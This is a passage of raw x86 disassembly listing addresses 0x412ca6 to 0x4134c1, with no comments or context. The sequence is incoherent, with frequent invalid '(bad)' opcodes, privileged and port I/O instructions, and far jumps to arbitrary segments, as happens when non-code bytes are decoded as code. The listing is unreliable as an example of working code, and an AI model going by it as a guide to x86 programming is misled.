  412ca6:	sbb    edx,DWORD PTR [eax-0x30ab7616]
  412cac:	adc    DWORD PTR [ecx-0x5fe248bf],esp
  412cb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb3:	and    al,BYTE PTR [esi-0x729cd181]
  412cb9:	xor    BYTE PTR [esi+0x9d9a99a],bh
  412cbf:	xchg   ebp,eax
  412cc0:	gs push ds
  412cc2:	iret   
  412cc3:	jns    0x412cf9
  412cc5:	(bad)  
  412cc6:	in     eax,0xd7
  412cc8:	add    BYTE PTR [esi-0x1d],0xcd
  412ccc:	dec    ebp
  412ccd:	es popa 
  412ccf:	imul   edx,eax,0xffffffa6
  412cd2:	cmp    ebp,ecx
  412cd4:	idiv   DWORD PTR [edx-0x3cc84005]
  412cda:	shl    BYTE PTR [si-0x7a],0xb2
  412cdf:	jl     0x412d12
  412ce1:	dec    eax
  412ce2:	jne    0x412d04
  412ce4:	xchg   ebp,ebp
  412ce6:	mov    ah,0x65
  412ce8:	jns    0x412d23
  412cea:	sub    ah,BYTE PTR [ebp+0x1e058461]
  412cf0:	loopne 0x412d37
  412cf2:	mov    bh,0x72
  412cf4:	pop    edi
  412cf5:	aas    
  412cf6:	pop    ds
  412cf7:	adc    ch,BYTE PTR [esi]
  412cf9:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412cfb:	dec    esi
  412cfc:	pop    ebp
  412cfd:	ds sahf 
  412cff:	mov    dh,0x41
  412d01:	xor    ebx,DWORD PTR [eax]
  412d03:	mov    dh,0x79
  412d05:	add    BYTE PTR [ebx-0x1f],bl
  412d08:	dec    eax
  412d09:	sub    ah,0xef
  412d0c:	fidivr WORD PTR [edx+0x77fce9be]
  412d12:	cmp    dl,dl
  412d14:	xchg   ebx,eax
  412d15:	mov    esp,DWORD PTR [edi-0x15]
  412d18:	pop    edx
  412d19:	jo     0x412d75
  412d1b:	dec    eax
  412d1c:	xchg   edx,eax
  412d1d:	(bad)  
  412d1e:	out    0xa3,al
  412d20:	add    DWORD PTR [edi],ebp
  412d22:	fisubr DWORD PTR [edi+0x4277b7e]
  412d28:	jge    0x412cfd
  412d2a:	xchg   edx,eax
  412d2b:	pop    esp
  412d2c:	mov    edi,0xf30bd14a
  412d31:	dec    edx
  412d32:	adc    ecx,esp
  412d34:	mov    eax,ds:0xdb77bb83
  412d39:	mov    bl,0xb8
  412d3b:	call   0xed55:0x1b6e4189
  412d42:	cdq    
  412d43:	(bad)  
  412d45:	rcl    DWORD PTR [edx],0xdc
  412d48:	je     0x412dc0
  412d4a:	js     0x412d70
  412d4c:	sbb    DWORD PTR [edx+0x3c955e37],ebp
  412d52:	aas    
  412d53:	mov    ah,0xca
  412d55:	jae    0x412daf
  412d57:	(bad)  
  412d5a:	cmp    DWORD PTR [esi],0xffffffe3
  412d5d:	mov    esi,0x23e9d927
  412d62:	cmp    al,0xb9
  412d64:	mov    ebp,0x834be423
  412d69:	jl     0x412dde
  412d6b:	sub    eax,DWORD PTR [edx+0x5d]
  412d6e:	lahf   
  412d6f:	jecxz  0x412d41
  412d71:	adc    ecx,DWORD PTR [eax]
  412d73:	sub    dh,dl
  412d75:	sbb    al,BYTE PTR [esi+0x60abed82]
  412d7b:	jmp    0x349a:0xcc3014bc
  412d82:	out    dx,al
  412d83:	jmp    0x2403e0e5
  412d88:	xor    BYTE PTR [eax*8-0x4899b739],0x10
  412d90:	sub    eax,0x99ee5885
  412d95:	cli    
  412d96:	sub    dh,ch
  412d98:	pop    esp
  412d99:	inc    esp
  412d9a:	sub    BYTE PTR [esi-0x36],cl
  412d9d:	jle    0x412df5
  412d9f:	pandn  mm0,QWORD PTR ds:0x3c75b29b
  412da6:	cld    
  412da7:	in     eax,dx
  412da8:	bnd js 0x412e23
  412dab:	jbe    0x412da9
  412dad:	out    dx,eax
  412dae:	mov    esi,0x906a5f0a
  412db3:	mov    esi,0xa9047d7b
  412db8:	sub    BYTE PTR [ecx-0xf],bh
  412dbb:	and    al,0x1
  412dbd:	sbb    esi,DWORD PTR [ebx-0x420caba2]
  412dc3:	sub    DWORD PTR [esi],edi
  412dc5:	adc    eax,0xa7f5ee14
  412dca:	lea    ecx,[edi+edx*4]
  412dcd:	scas   al,BYTE PTR es:[edi]
  412dce:	stos   BYTE PTR es:[edi],al
  412dcf:	ror    esp,0x6f
  412dd2:	mov    dh,0x25
  412dd4:	test   ah,ah
  412dd6:	pop    eax
  412dd7:	jp     0x412d8a
  412dd9:	cmp    dh,BYTE PTR [esi]
  412ddb:	add    bh,ch
  412ddd:	fcomp  DWORD PTR [ebp+0x7d7efc72]
  412de3:	das    
  412de4:	jne    0x412e35
  412de6:	adc    DWORD PTR [esi+edi*4],edi
  412de9:	sbb    BYTE PTR [edi],dh
  412deb:	mov    dh,0x36
  412ded:	and    BYTE PTR [edx],ah
  412def:	call   0xd387:0x5d6392b4
  412df6:	or     esp,DWORD PTR [ebx]
  412df8:	popf   
  412df9:	imul   edx,ebp,0xfffffff6
  412dfc:	mov    ecx,0xa46fb5a5
  412e01:	fst    QWORD PTR [ebx]
  412e03:	xchg   esi,eax
  412e04:	lea    ebp,[edi]
  412e06:	or     al,0x21
  412e08:	fcmovne st,st(6)
  412e0a:	scas   al,BYTE PTR es:[edi]
  412e0b:	inc    ebp
  412e0c:	xchg   ecx,eax
  412e0d:	adc    al,0x20
  412e0f:	mov    al,ds:0xc2a385cc
  412e14:	push   edx
  412e15:	mov    ecx,0x786ce0b1
  412e1a:	and    al,0xbe
  412e1c:	cmc    
  412e1d:	repnz pop es
  412e1f:	and    DWORD PTR [ebx+edi*4-0x36],0x0
  412e24:	jne    0x412e9e
  412e26:	int    0x7e
  412e28:	aad    0xb9
  412e2a:	mov    cl,0x52
  412e2c:	xchg   ebx,eax
  412e2d:	ret    
  412e2e:	sar    DWORD PTR [esi],cl
  412e30:	cld    
  412e31:	ror    BYTE PTR [esi+0x3ec52c1a],1
  412e37:	stc    
  412e38:	cmovbe edx,DWORD PTR [eax+0x7d]
  412e3c:	fisttp QWORD PTR [esi+0x7b]
  412e3f:	sub    eax,0x8a4a178a
  412e44:	rcl    DWORD PTR [ebp-0x3e0297c6],1
  412e4a:	lahf   
  412e4b:	sbb    al,BYTE PTR [esi+eiz*4-0x71d4ef63]
  412e52:	test   al,0x88
  412e54:	cmp    ah,BYTE PTR [edi-0x48d848a7]
  412e5a:	inc    ecx
  412e5b:	fcom   QWORD PTR [edx*8+0x42cf97cb]
  412e62:	push   ebx
  412e63:	xchg   edx,eax
  412e64:	jbe    0x412e98
  412e66:	jp     0x412ea3
  412e68:	das    
  412e69:	pop    es
  412e6a:	inc    edx
  412e6b:	add    eax,0xcb62b9
  412e70:	(bad)  
  412e71:	cmp    DWORD PTR [ebp+0x2b4e7587],eax
  412e77:	xchg   ebx,eax
  412e78:	cmp    eax,0x4d59e7e9
  412e7d:	mov    bh,0xaa
  412e7f:	adc    DWORD PTR [edx-0x59bbe718],edi
  412e85:	jno    0x412ed3
  412e87:	pop    ecx
  412e88:	adc    ebx,DWORD PTR [edi]
  412e8a:	scas   eax,DWORD PTR es:[edi]
  412e8b:	in     al,0xb3
  412e8d:	mov    edi,ebp
  412e8f:	push   ds
  412e90:	retf   0x662d
  412e93:	add    BYTE PTR [esi-0x1ce7fb0f],bl
  412e99:	inc    edi
  412e9a:	adc    eax,0x4b150e90
  412e9f:	xchg   edx,eax
  412ea0:	(bad)  
  412ea1:	sbb    al,0xe4
  412ea3:	xchg   edx,eax
  412ea4:	and    eax,0x32100ece
  412ea9:	jno    0x412e8c
  412eab:	inc    ebx
  412eac:	loop   0x412ec7
  412eae:	lods   eax,DWORD PTR ds:[esi]
  412eaf:	jge    0x412e3d
  412eb1:	cmp    al,0xe6
  412eb3:	lock and DWORD PTR [ecx-0x52],ebp
  412eb7:	test   BYTE PTR [esi-0x1a07bd34],ah
  412ebd:	out    0x17,al
  412ebf:	mov    esp,DWORD PTR [ebp-0x29]
  412ec2:	hlt    
  412ec3:	shl    BYTE PTR [eax],0xf3
  412ec6:	gs push cs
  412ec8:	daa    
  412ec9:	add    BYTE PTR [edx],cl
  412ecb:	or     eax,0x21be5f9f
  412ed0:	jl     0x412e89
  412ed2:	mov    ds:0x5bb2609d,eax
  412ed7:	outs   dx,BYTE PTR ds:[esi]
  412ed8:	or     bh,dl
  412eda:	cmp    DWORD PTR [ecx],edx
  412edc:	push   ebx
  412edd:	int    0x7
  412edf:	inc    ecx
  412ee0:	rcr    BYTE PTR [edx],0x51
  412ee3:	xchg   edx,eax
  412ee4:	call   0x66ee:0x39036da9
  412eeb:	xor    eax,0x4d1d2283
  412ef0:	test   eax,0x41a27d56
  412ef5:	fbld   TBYTE PTR [ebp-0x46]
  412ef8:	cmp    eax,0x181d5f67
  412efd:	neg    dh
  412eff:	cmp    DWORD PTR [esi],edx
  412f01:	fdiv   DWORD PTR [esp+ecx*8-0x471e2bb3]
  412f08:	mov    esi,ebx
  412f0a:	and    eax,0x735e61fe
  412f0f:	add    bh,BYTE PTR [esi+0x3e]
  412f12:	ret    
  412f13:	add    BYTE PTR [ecx+eax*2-0x2df172e4],0x50
  412f1b:	jo     0x412ed9
  412f1d:	xchg   DWORD PTR fs:[eax],esp
  412f20:	fbld   TBYTE PTR [ebx-0x66]
  412f23:	add    BYTE PTR [ecx-0x4a4fde5],cl
  412f29:	jl     0x412f84
  412f2b:	and    al,0xa9
  412f2d:	bound  esp,QWORD PTR [ecx+0x1ac210a6]
  412f33:	fdivr  st,st(6)
  412f35:	inc    ebp
  412f36:	scas   al,BYTE PTR es:[edi]
  412f37:	std    
  412f38:	and    DWORD PTR [ecx+0x78],edx
  412f3b:	mov    cl,0xae
  412f3d:	lods   al,BYTE PTR ds:[esi]
  412f3e:	mov    edx,0x33bf332a
  412f43:	jmp    0xbf4d:0x4facfd6a
  412f4a:	push   esp
  412f4b:	in     eax,dx
  412f4c:	shr    ebp,cl
  412f4e:	cli    
  412f4f:	cdq    
  412f50:	mov    esp,0xad30980d
  412f55:	int3   
  412f56:	mov    ecx,0x31b79d3
  412f5b:	loopne 0x412ee5
  412f5d:	inc    esi
  412f5e:	push   esp
  412f5f:	dec    ecx
  412f60:	inc    eax
  412f61:	ds in  al,dx
  412f63:	arpl   WORD PTR [ebx+eiz*2-0x30],sp
  412f67:	mov    edx,edx
  412f69:	mov    eax,0xb22d2e99
  412f6e:	inc    ebx
  412f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f70:	push   ebp
  412f71:	or     esp,0x11
  412f74:	mov    edx,ds
  412f76:	xchg   edi,eax
  412f77:	jae    0x412ff7
  412f79:	sbb    ch,BYTE PTR [ecx-0x4b]
  412f7c:	aaa    
  412f7d:	enter  0x8b0d,0xb3
  412f81:	cdq    
  412f82:	cmp    al,0x26
  412f84:	dec    edi
  412f85:	stc    
  412f86:	(bad)
  412f8b:	push   es
  412f8c:	cmp    bl,al
  412f8e:	cmp    DWORD PTR [esi-0xd131556],ebp
  412f94:	dec    BYTE PTR [esp+edx*2-0x5a7e1740]
  412f9b:	dec    esp
  412f9c:	aas    
  412f9d:	pop    ss
  412f9e:	mov    cs,edx
  412fa0:	loop   0x412fcc
  412fa2:	cmp    bh,BYTE PTR [ecx+edx*8-0x2ef52b31]
  412fa9:	das    
  412faa:	jb     0x412f38
  412fac:	mov    cl,0x28
  412fae:	mov    fs,WORD PTR [esp+eax*8]
  412fb1:	xor    BYTE PTR [esi-0x42],bl
  412fb4:	cmp    al,0x62
  412fb6:	add    dh,al
  412fb8:	or     DWORD PTR [esi],0x48bed5e9
  412fbe:	mov    ds:0xa6fd9cbf,al
  412fc3:	out    dx,al
  412fc4:	push   cs
  412fc5:	and    bl,cl
  412fc7:	adc    DWORD PTR [ecx],0xffffffd6
  412fca:	pop    eax
  412fcb:	jecxz  0x412f8d
  412fcd:	mov    bh,0x77
  412fcf:	mov    DWORD PTR [edi+eax*1+0x39],esi
  412fd3:	sub    BYTE PTR [edx+0x7fd2bbb],al
  412fd9:	sbb    DWORD PTR [esi+edx*1+0x3c308ac2],ebp
  412fe0:	in     eax,dx
  412fe1:	loop   0x412fc4
  412fe3:	repnz fwait
  412fe5:	mov    ah,0xdb
  412fe7:	test   BYTE PTR [esi-0x9],0x94
  412feb:	fbld   TBYTE PTR [eax-0x396d3098]
  412ff1:	push   ss
  412ff2:	push   ebp
  412ff3:	mov    ds:0xa5286b30,al
  412ff8:	mov    eax,ds:0x295d8d39
  412ffd:	ss in  al,0xcc
  413000:	mov    al,0x86
  413002:	in     eax,0xe3
  413004:	and    DWORD PTR [esi-0x2f95e89d],0x61
  41300b:	xor    DWORD PTR [ebp+edi*8-0x5f0365cd],esi
  413012:	stos   DWORD PTR es:[edi],eax
  413013:	popf   
  413014:	cmp    al,0xf4
  413016:	ins    BYTE PTR es:[edi],dx
  413017:	outs   dx,BYTE PTR ds:[esi]
  413018:	sub    ah,BYTE PTR [edi+0x30]
  41301b:	or     al,0xae
  41301d:	inc    ecx
  41301e:	jecxz  0x412ff1
  413020:	pop    ds
  413021:	sub    eax,0x3f3c10c2
  413026:	scas   eax,DWORD PTR es:[edi]
  413027:	jnp    0x41307c
  413029:	mov    dh,0x96
  41302b:	xchg   BYTE PTR [ebp+0x58a98568],bh
  413031:	mov    dl,0x6f
  413033:	stos   BYTE PTR es:[edi],al
  413034:	inc    esp
  413035:	pop    es
  413036:	adc    bl,BYTE PTR [ebp-0x43]
  413039:	mov    ecx,0x15242a47
  41303e:	mov    edx,DWORD PTR [ebx+0x7ecef2a]
  413044:	push   ebp
  413045:	in     al,dx
  413046:	mov    dh,BYTE PTR [edi-0x52dd2386]
  41304c:	aam    0xd2
  41304e:	mov    ds:0xeb0505bd,al
  413053:	cmp    al,0x23
  413055:	mov    edx,0x673f98a9
  41305a:	shl    DWORD PTR [edi-0x4c252b94],1
  413060:	mov    edx,0x75d1caff
  413065:	xchg   esp,eax
  413066:	xor    dl,cl
  413068:	(bad)  
  413069:	sbb    al,0x15
  41306b:	in     al,0x1e
  41306d:	inc    ecx
  41306e:	add    bl,dh
  413070:	fisubr WORD PTR [edx]
  413072:	outs   dx,DWORD PTR ds:[esi]
  413073:	mov    ecx,0x8276d3df
  413078:	adc    dh,BYTE PTR [esi+0x55]
  41307b:	ss xchg ecx,eax
  41307d:	fdivr  DWORD PTR ds:0xf2556d78
  413083:	adc    al,0xa7
  413085:	inc    edi
  413086:	cld    
  413087:	and    al,0x5
  413089:	sbb    cl,BYTE PTR [ecx+0x5eecf466]
  41308f:	shl    dl,0xb0
  413092:	cmp    BYTE PTR [edi],bl
  413094:	(bad)  
  413095:	mov    BYTE PTR [edx-0x6a55e1b9],dl
  41309b:	add    BYTE PTR [edi-0x10],bl
  41309e:	jge    0x4130c4
  4130a0:	cmp    al,0xf6
  4130a2:	in     al,dx
  4130a3:	fcom   st(2)
  4130a5:	xchg   edi,eax
  4130a6:	ins    DWORD PTR es:[edi],dx
  4130a7:	or     cl,dl
  4130a9:	push   ss
  4130aa:	dec    esi
  4130ab:	sbb    cl,BYTE PTR [ecx+0x72f132be]
  4130b1:	popa   
  4130b2:	sbb    bl,BYTE PTR [esi-0x15aa217c]
  4130b8:	call   0x89ad:0xf00a91ec
  4130bf:	shl    DWORD PTR [edx],cl
  4130c1:	sub    dl,bh
  4130c3:	mov    ah,0x6a
  4130c5:	mov    al,ds:0x5a6724c3
  4130ca:	ss icebp 
  4130cc:	mov    bh,0x80
  4130ce:	adc    DWORD PTR [ebp-0x11],eax
  4130d1:	pop    ebx
  4130d2:	adc    bh,BYTE PTR [ebx-0xd]
  4130d5:	jne    0x413142
  4130d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d8:	xchg   ebp,eax
  4130d9:	push   0xca00f559
  4130de:	(bad)  
  4130e0:	pop    edx
  4130e1:	jle    0x413115
  4130e3:	inc    ebp
  4130e4:	test   eax,0x99ba9cec
  4130e9:	enter  0x8b13,0x55
  4130ed:	out    dx,eax
  4130ee:	inc    DWORD PTR [edi+eiz*8+0x258ce3ec]
  4130f5:	inc    ebx
  4130f6:	in     al,0xec
  4130f8:	(bad)  
  4130f9:	aad    0x89
  4130fb:	and    edx,DWORD PTR fs:[edx]
  4130fe:	in     eax,0x42
  413100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413101:	mov    edx,0x78580672
  413106:	mov    DWORD PTR [ebx],ebp
  413108:	bound  esi,QWORD PTR [eax-0x240d0c68]
  41310e:	imul   edi,DWORD PTR [eax-0x2b],0x90f5edbf
  413115:	aam    0x5a
  413117:	sub    al,0xb6
  413119:	xchg   esi,eax
  41311a:	mov    ds:0x7a287cd,al
  41311f:	and    eax,0xde2f7f49
  413124:	sti    
  413125:	sub    al,0xd
  413127:	ja     0x4130e3
  413129:	xor    al,0x55
  41312b:	into   
  41312c:	mov    ecx,0xb69f3952
  413131:	jbe    0x41311c
  413133:	pop    ds
  413134:	or     al,0xe1
  413136:	mov    ecx,0x759be6a6
  41313b:	das    
  41313c:	loopne 0x4131a1
  41313e:	sbb    bh,BYTE PTR [eax+0x398e6f23]
  413144:	add    eax,0x664db0a3
  413149:	lods   al,BYTE PTR ds:[esi]
  41314a:	(bad)  
  41314b:	call   FWORD PTR [edx+0x2f2d4300]
  413151:	test   eax,0x2cb5f69e
  413156:	inc    edx
  413157:	inc    ebp
  413158:	mov    dh,0x5e
  41315a:	ret    0x114f
  41315d:	mov    dh,ch
  41315f:	mov    DWORD PTR [esi+0x4b521ff3],esi
  413165:	sub    BYTE PTR [ebx+0x108e79d2],dh
  41316b:	sub    al,0xad
  41316d:	cmc    
  41316e:	clc    
  41316f:	leave  
  413170:	inc    esi
  413171:	jns    0x4131cc
  413173:	pop    ebp
  413174:	push   0x3bfe1e95
  413179:	into   
  41317a:	imul   si,WORD PTR [esi]
  41317e:	pusha  
  41317f:	enter  0x186,0x67
  413183:	ret    
  413184:	jbe    0x4131d4
  413186:	gs inc ecx
  413188:	dec    esp
  413189:	fwait
  41318a:	xor    al,0xfb
  41318c:	mov    DWORD PTR [eax-0x34],edi
  41318f:	jae    0x41314e
  413191:	sahf   
  413192:	pop    ds
  413193:	mov    dh,0x79
  413195:	mov    ecx,0x271c375f
  41319a:	adc    eax,0xa14a429b
  41319f:	hlt    
  4131a0:	int3   
  4131a1:	push   esi
  4131a2:	aas    
  4131a3:	and    eax,0x5254052c
  4131a8:	xor    ebx,DWORD PTR [ecx-0x13]
  4131ab:	sbb    al,0xf1
  4131ad:	pop    ebx
  4131ae:	into   
  4131af:	hlt    
  4131b0:	frstor [ebp+0x28b91644]
  4131b6:	add    eax,0xff8f8688
  4131bb:	xor    al,0xef
  4131bd:	outs   dx,BYTE PTR ds:[esi]
  4131be:	adc    al,0xaf
  4131c0:	shl    eax,0x40
  4131c3:	sbb    BYTE PTR [ebx+0x3abcc548],0x4a
  4131ca:	sbb    al,0xd4
  4131cc:	sub    edi,DWORD PTR [eax+0x68666202]
  4131d2:	(bad)  
  4131d4:	retf   
  4131d5:	ror    DWORD PTR [edx],cl
  4131d7:	iret   
  4131d8:	pop    ecx
  4131d9:	mov    dl,0x3
  4131db:	and    ah,BYTE PTR [eax]
  4131dd:	in     al,dx
  4131de:	jne    0x413241
  4131e0:	pop    eax
  4131e1:	(bad)  
  4131e3:	jl     0x41325c
  4131e5:	out    dx,al
  4131e6:	inc    ecx
  4131e7:	in     eax,dx
  4131e8:	ror    DWORD PTR [esi-0x3f3d9996],cl
  4131ee:	inc    esi
  4131ef:	(bad)  
  4131f0:	call   0x3252:0x113f0b55
  4131f7:	mov    esp,0x4d81e1e9
  4131fc:	fcmovbe st,st(6)
  4131fe:	xlat   BYTE PTR ds:[ebx]
  4131ff:	pushf  
  413200:	test   DWORD PTR [eax+0x4f43fb50],ecx
  413206:	nop
  413207:	hlt    
  413208:	xchg   ecx,eax
  413209:	lea    ebx,[ebp+0x6fafb71a]
  41320f:	mul    BYTE PTR [esi-0x7f430866]
  413215:	fld    DWORD PTR [ebx+0x7c]
  413218:	out    dx,al
  413219:	out    0x46,al
  41321b:	je     0x413280
  41321d:	out    dx,eax
  41321e:	pop    ebx
  41321f:	repz std 
  413221:	dec    esp
  413222:	cmp    eax,0x9c32a852
  413227:	mov    esp,esi
  413229:	ds inc eax
  41322b:	jge    0x413206
  41322d:	or     DWORD PTR ds:0x6309b125,edi
  413233:	push   ebp
  413234:	lods   eax,DWORD PTR ds:[esi]
  413235:	movzx  esp,ch
  413238:	stos   DWORD PTR es:[edi],eax
  413239:	ror    BYTE PTR [edi+0x62],1
  41323c:	inc    eax
  41323d:	call   0xf921f571
  413242:	mov    eax,DWORD PTR [ebx+0x74]
  413245:	in     al,0xfc
  413247:	cmp    eax,0xccd2f8fd
  41324c:	out    0x8,eax
  41324e:	xchg   BYTE PTR [edi],bh
  413250:	push   edi
  413251:	jle    0x4131da
  413253:	(bad)  
  413254:	push   esp
  413255:	popa   
  413256:	and    esi,ecx
  413258:	test   eax,0xe5e3b790
  41325d:	xor    al,0xda
  41325f:	and    al,0x8b
  413261:	sub    DWORD PTR [ebx-0x3af37312],edx
  413267:	and    DWORD PTR fs:[ebp+0x33],ebp
  41326b:	adc    DWORD PTR [eax+esi*2],ebp
  41326e:	cld    
  41326f:	sub    DWORD PTR [esi],ebp
  413271:	aad    0x67
  413273:	sub    al,0xf8
  413275:	add    edx,DWORD PTR [eax+0x6b]
  413278:	cmp    BYTE PTR [ecx],dh
  41327a:	cs fdivr st(5),st
  41327d:	pop    ebp
  41327e:	push   0x39
  413280:	lock push edx
  413282:	jns    0x413273
  413284:	(bad)  
  413286:	and    cl,BYTE PTR [ebp-0x20]
  413289:	sbb    dh,bl
  41328b:	or     BYTE PTR [ecx+0x20],al
  41328e:	je     0x413302
  413290:	int3   
  413291:	xor    cl,BYTE PTR [edx+edx*1]
  413294:	mov    ah,0x75
  413296:	cmp    eax,0x822a2e35
  41329b:	and    BYTE PTR [esi-0x7f],al
  41329e:	ss inc eax
  4132a0:	push   esi
  4132a1:	dec    ecx
  4132a2:	mov    eax,ds:0x359bdee2
  4132a7:	xor    esp,DWORD PTR [esi-0x69]
  4132aa:	mov    ecx,DWORD PTR [esi]
  4132ac:	push   cs
  4132ad:	inc    esi
  4132ae:	mov    BYTE PTR [esi-0x1928ccf7],bl
  4132b4:	dec    edi
  4132b5:	add    eax,0xbe2bc95f
  4132ba:	daa    
  4132bb:	mov    DWORD PTR [ecx-0x57],edx
  4132be:	adc    eax,DWORD PTR ds:0xa10f976f
  4132c4:	in     al,dx
  4132c5:	inc    esi
  4132c6:	sbb    esp,edx
  4132c8:	cmp    esp,DWORD PTR [edx]
  4132ca:	lods   al,BYTE PTR ds:[esi]
  4132cb:	push   edi
  4132cc:	bound  esi,QWORD PTR [ecx+0x76a0730b]
  4132d2:	scas   eax,DWORD PTR es:[edi]
  4132d3:	(bad)  
  4132d4:	jno    0x413309
  4132d6:	(bad)  
  4132d8:	fnstcw WORD PTR [ebx+ebp*4]
  4132db:	mov    ds:0x2ee8bb3c,al
  4132e0:	xchg   ebx,eax
  4132e1:	inc    ebx
  4132e3:	dec    ecx
  4132e4:	push   ebx
  4132e5:	das    
  4132e6:	and    bl,BYTE PTR ds:0x2fc624c
  4132ec:	mov    al,0x8f
  4132ee:	fmulp  st(6),st
  4132f0:	jno    0x4132f2
  4132f2:	add    edi,eax
  4132f4:	xchg   BYTE PTR ds:0x6af952a,dh
  4132fa:	xchg   ecx,eax
  4132fb:	in     eax,dx
  4132fc:	or     ebp,esp
  4132fe:	int    0x67
  413300:	in     eax,dx
  413301:	scas   eax,DWORD PTR es:[edi]
  413302:	fsubp  st(2),st
  413304:	mov    eax,0x19f315d1
  413309:	lock and DWORD PTR [edi-0x52],edx
  41330d:	sar    DWORD PTR [eax-0x3218f368],1
  413313:	in     al,dx
  413314:	cmp    BYTE PTR [edi-0x291dd522],ah
  41331a:	sti    
  41331b:	xor    ch,BYTE PTR es:[edi+0x6dabd059]
  413322:	jp     0x413380
  413324:	dec    esi
  413325:	(bad)  
  413326:	mov    edi,0x344fb624
  41332b:	gs jns 0x41336e
  41332e:	stc    
  41332f:	xor    BYTE PTR [edx],dl
  413331:	into   
  413332:	les    ebp,FWORD PTR [eax]
  413334:	imul   edx,DWORD PTR [ebx+0x3d8153b],0xffffffb7
  41333b:	or     eax,0xa5fc60db
  413340:	shl    BYTE PTR ds:0xeebd9ba2,cl
  413346:	xchg   ebx,eax
  413347:	pop    edx
  413348:	push   edx
  413349:	pop    ebp
  41334a:	ret    0xd8ba
  41334d:	inc    ebx
  41334e:	daa    
  41334f:	hlt    
  413350:	fcmovnu st,st(4)
  413352:	mov    cl,0xf5
  413354:	fimul  WORD PTR [eax+0x1b]
  413357:	xchg   BYTE PTR [ebp-0x80],dl
  41335a:	int3   
  41335b:	adc    cl,dl
  41335d:	ins    DWORD PTR es:[edi],dx
  41335e:	data16 in al,0xa5
  413361:	(bad)  
  413362:	pop    ds
  413363:	lods   al,BYTE PTR ds:[esi]
  413365:	out    0x31,eax
  413367:	imul   ecx,DWORD PTR [ebx],0x97a04237
  41336d:	test   ebx,edx
  41336f:	enter  0x8817,0x64
  413373:	and    bh,BYTE PTR ds:0xef044d76
  413379:	int    0x3b
  41337b:	in     al,0xa7
  41337d:	pushf  
  41337e:	lock xchg ecx,eax
  413380:	shl    DWORD PTR [ebx+0xb],0x70
  413384:	data16 repz xor al,0xea
  413388:	xchg   ebx,eax
  413389:	addr16 push es
  41338b:	push   ebp
  41338c:	aad    0x2c
  41338e:	push   ebx
  41338f:	mov    eax,ds:0x7c50ff00
  413394:	cmp    BYTE PTR [ecx+0x27e7b1c3],dh
  41339a:	push   es
  41339b:	je     0x413386
  41339d:	adc    cl,cl
  41339f:	xchg   BYTE PTR ds:0xdd847d6,ah
  4133a5:	xchg   esp,eax
  4133a6:	mov    WORD PTR [ebx+0x7fd4b750],cs
  4133ac:	add    eax,0xa179719b
  4133b1:	clc    
  4133b2:	mov    ch,0xbc
  4133b4:	push   0xa61f229d
  4133b9:	sar    BYTE PTR [edi],1
  4133bb:	mov    esp,DWORD PTR [esi+0x27be34f8]
  4133c1:	jmp    0x41335c
  4133c3:	pop    edi
  4133c4:	inc    ebp
  4133c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c6:	lock cmp ebp,DWORD PTR [ecx+0x49c0b7a7]
  4133cd:	arpl   si,ax
  4133cf:	push   ds
  4133d0:	enter  0x9d0a,0x28
  4133d4:	leave  
  4133d5:	mov    eax,ds:0xcf395a3
  4133da:	loopne 0x4133b5
  4133dc:	jne    0x41342b
  4133de:	rcl    ebp,0xd1
  4133e1:	sub    edx,DWORD PTR [eax-0x37b4c8da]
  4133e7:	fstp   DWORD PTR [edx-0x61]
  4133ea:	fsub   DWORD PTR [esp+eiz*4]
  4133ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133ee:	ins    BYTE PTR es:[edi],dx
  4133ef:	or     BYTE PTR [eax+0xe1bbd75],0xc1
  4133f6:	dec    ecx
  4133f7:	cld    
  4133f8:	stc    
  4133f9:	pop    esp
  4133fa:	or     dh,BYTE PTR [esi+0x4]
  4133fd:	inc    edi
  4133fe:	cwde   
  4133ff:	mov    ecx,0x67115a95
  413404:	inc    esi
  413405:	pop    edi
  413406:	(bad)  
  413407:	jae    0x4133ca
  413409:	inc    ebp
  41340a:	(bad)  
  41340b:	mov    ds:0x27f151ff,eax
  413410:	ret    0x8367
  413413:	daa    
  413414:	sub    edx,DWORD PTR [ebx]
  413416:	loop   0x41347d
  413418:	or     eax,0xfaaaf4c6
  41341d:	ret    0x99dd
  413420:	mov    cl,0x3f
  413422:	cmp    eax,0x779b2d33
  413427:	mov    ecx,0xa54ca85f
  41342c:	mov    al,0x4
  41342e:	adc    BYTE PTR [edx+0x7e],ch
  413431:	lahf   
  413432:	dec    BYTE PTR [ebp+0x2f6afbb1]
  413438:	jmp    0xc151:0xb9df217a
  41343f:	fwait
  413440:	jmp    0x4134bf
  413442:	pop    eax
  413443:	out    dx,ax
  413445:	and    BYTE PTR [edi],cl
  413447:	fmul   QWORD PTR [eax+0x1]
  41344a:	push   es
  41344b:	add    edi,DWORD PTR [esi+eax*8+0x699e1e5c]
  413452:	add    al,ch
  413454:	adc    bh,ch
  413456:	adc    DWORD PTR [edx-0x606b87b1],edi
  41345c:	repnz mov edx,0xf31bd4df
  413462:	jbe    0x4134cc
  413464:	push   0x19
  413466:	leave  
  413467:	push   ss
  413468:	mov    eax,ds:0xeecb0046
  41346d:	push   ebp
  41346e:	loope  0x4134a2
  413470:	cmp    BYTE PTR [ecx],ch
  413472:	jbe    0x41341b
  413474:	aad    0x40
  413476:	test   DWORD PTR [ecx+0x7f0eba56],eax
  41347c:	fadd   QWORD PTR [eax-0x664ca44f]
  413482:	xchg   ebx,eax
  413483:	jge    0x4134d9
  413485:	addr16 push cs
  413487:	int    0xb1
  413489:	loopne 0x4134df
  41348b:	pop    ecx
  41348c:	mov    edi,0xc847e838
  413491:	xchg   edx,eax
  413492:	call   0x5956e01d
  413497:	mov    ss,edi
  413499:	jmp    0xb46c9ff2
  41349e:	repz dec eax
  4134a0:	jns    0x413478
  4134a2:	mov    bl,0xfb
  4134a4:	iret   
  4134a5:	adc    al,0x79
  4134a7:	inc    edi
  4134a8:	repnz fs xchg edi,eax
  4134ab:	enter  0x2576,0x5d
  4134af:	sub    eax,ebp
  4134b1:	or     al,0xdb
  4134b3:	sub    bl,cl
  4134b5:	inc    esi
  4134b6:	enter  0xe0d7,0x29
  4134ba:	rol    al,1
  4134bc:	or     eax,0xa6c6adef
  4134c1:	push   0x2d
